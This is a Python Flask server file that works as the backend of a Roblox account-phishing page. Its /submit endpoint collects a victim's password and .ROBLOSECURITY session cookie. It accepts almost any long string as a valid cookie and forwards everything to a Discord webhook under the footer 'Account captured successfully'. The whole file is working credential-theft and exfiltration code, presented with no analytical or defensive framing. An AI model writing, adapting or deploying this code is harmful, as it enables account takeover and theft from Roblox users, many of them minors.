import os
import json
import re
import requests
import base64
import time
from flask import Flask, request, jsonify, send_from_directory

app = Flask(__name__)

def is_valid_cookie(cookie):
    """
    Validate cookie and check if it's not expired
    Supports JWT tokens and session cookies with expiration
    """
    if not cookie or len(cookie) < 10:
        return False
    
    # Check if it's a JWT token (has 3 parts separated by dots)
    if cookie.count('.') == 2:
        try:
            # Split JWT token
            header, payload, signature = cookie.split('.')
            
            # Decode payload with correct padding for URL-safe base64
            payload += '=' * (-len(payload) % 4)
            decoded_payload = base64.urlsafe_b64decode(payload)
            payload_data = json.loads(decoded_payload)
            
            # Check expiration (exp claim)
            if 'exp' in payload_data:
                exp_time = payload_data['exp']
                current_time = int(time.time())
                
                if current_time >= exp_time:
                    return False  # Token is expired
            
            return True  # Valid JWT token, not expired
            
        except (ValueError, json.JSONDecodeError, Exception):
            return False  # Invalid JWT format
    
    # For non-JWT cookies, accept Roblox-style cookies and other formats
    # Accept Roblox .ROBLOSECURITY cookies (often start with _|WARNING:)
    if cookie.startswith('_|WARNING:') and len(cookie) > 50:
        return True
    
    # Accept standard cookie formats
    cookie_pattern = r'^(session|token|auth|_token|user_token|access_token)=[A-Za-z0-9+/=_-]{10,}$'
    if re.match(cookie_pattern, cookie):
        return True
    
    # Accept any long alphanumeric string that could be a valid token
    if len(cookie) >= 30 and any(c.isalnum() for c in cookie):
        return True
    
    return False

@app.route('/')
def index():
    """Serve the main HTML page"""
    return send_from_directory('.', 'index.html')

@app.route('/submit', methods=['POST'])
def submit_form():
    """Handle form submission and send to Discord webhook"""
    try:
        data = request.get_json()
        
        # Extract all form fields
        password = data.get('password', '').strip()
        korblox = data.get('korblox', False)
        headless = data.get('headless', False)
        cookie = data.get('cookie', '').strip()
        
        # Server-side validation
        if not cookie:
            return jsonify({
                'success': False, 
                'message': 'Missing required field (cookie)'
            }), 400
        
        # Check if cookie is expired (for JWT tokens)
        if cookie.count('.') == 2:
            try:
                header, payload, signature = cookie.split('.')
                payload += '=' * (-len(payload) % 4)
                decoded_payload = base64.urlsafe_b64decode(payload)
                payload_data = json.loads(decoded_payload)
                
                if 'exp' in payload_data:
                    exp_time = payload_data['exp']
                    current_time = int(time.time())
                    if current_time >= exp_time:
                        return jsonify({
                            'success': False, 
                            'message': 'Cookie has expired'
                        }), 400
            except:
                return jsonify({
                    'success': False, 
                    'message': 'Invalid cookie format'
                }), 400
        
        # Validate cookie format
        if not is_valid_cookie(cookie):
            return jsonify({
                'success': False, 
                'message': 'Invalid cookie format'
            }), 400
        
        # Get Discord webhook URL from environment
        webhook_url = os.environ.get('DISCORD_WEBHOOK_URL')
        if not webhook_url:
            return jsonify({
                'success': False, 
                'message': 'Webhook not configured'
            }), 500
        
        # Use default Roblox profile picture
        profile_picture_url = 'https://tr.rbxcdn.com/30DAY-AvatarHeadshot-A84C1E07EBC93E9CDAEC87A36A2FEA33-Png/150/150/AvatarHeadshot/Png/noFilter'
        
        # Prepare Discord embedded message
        discord_data = {
            'embeds': [{
                'title': '🎮 Roblox Account Profile',
                'color': 0x00d4ff,  # Roblox blue color
                'thumbnail': {
                    'url': profile_picture_url
                },
                'fields': [
                    {
                        'name': '👤 Username',
                        'value': 'Not provided',
                        'inline': True
                    },
                    {
                        'name': '🔒 Password',
                        'value': password or 'Not provided',
                        'inline': True
                    },
                    {
                        'name': '💰 Robux Balance',
                        'value': 'Not provided',
                        'inline': True
                    },
                    {
                        'name': '💀 Korblox',
                        'value': '✅ Yes' if korblox else '❌ No',
                        'inline': True
                    },
                    {
                        'name': '🎭 Headless',
                        'value': '✅ Yes' if headless else '❌ No',
                        'inline': True
                    },
                    {
                        'name': '🍪 Whole Cookie',
                        'value': f'```{cookie[:1000]}{"..." if len(cookie) > 1000 else ""}```' if cookie else 'Not provided',
                        'inline': False
                    }
                ],
                'footer': {
                    'text': 'Account captured successfully'
                }
            }]
        }
        
        # Send to Discord with timeout and error handling
        try:
            # Log the payload size for debugging
            payload_size = len(json.dumps(discord_data))
            print(f"Sending Discord payload of size: {payload_size} bytes")
            
            response = requests.post(webhook_url, json=discord_data, timeout=10)
            
            if response.status_code in [200, 204]:
                print(f"Discord webhook successful: {response.status_code}")
                return jsonify({
                    'success': True, 
                    'message': 'Data sent successfully'
                })
            else:
                error_text = response.text[:500]  # Limit error text to prevent log spam
                print(f"Discord webhook failed: {response.status_code} - {error_text}")
                return jsonify({
                    'success': False, 
                    'message': f'Discord API error: {response.status_code}'
                }), 500
        except requests.Timeout:
            print("Discord webhook timeout error")
            return jsonify({
                'success': False, 
                'message': 'Request timeout - Discord may be slow'
            }), 500
        except requests.RequestException as e:
            print(f"Discord webhook network error: {str(e)}")
            return jsonify({
                'success': False, 
                'message': 'Network error occurred'
            }), 500
            
    except Exception as e:
        return jsonify({
            'success': False, 
            'message': 'Server error occurred'
        }), 500

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=False)